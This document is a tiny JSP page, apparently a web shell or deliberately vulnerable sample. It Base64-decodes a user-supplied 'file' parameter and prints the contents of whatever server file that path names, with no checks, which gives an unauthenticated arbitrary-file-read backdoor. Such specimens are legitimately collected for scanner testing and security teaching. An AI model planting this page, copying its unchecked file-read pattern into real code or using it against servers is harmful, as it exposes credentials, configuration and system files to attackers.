<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.commons.codec.binary.Base64" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>

<pre>
<%
    String base64Str = request.getParameter("file");

    if (base64Str != null) {
        String file = new String(Base64.decodeBase64(base64Str));
        out.println(new String(Files.readAllBytes(Paths.get(file))));
    }
%>
</pre>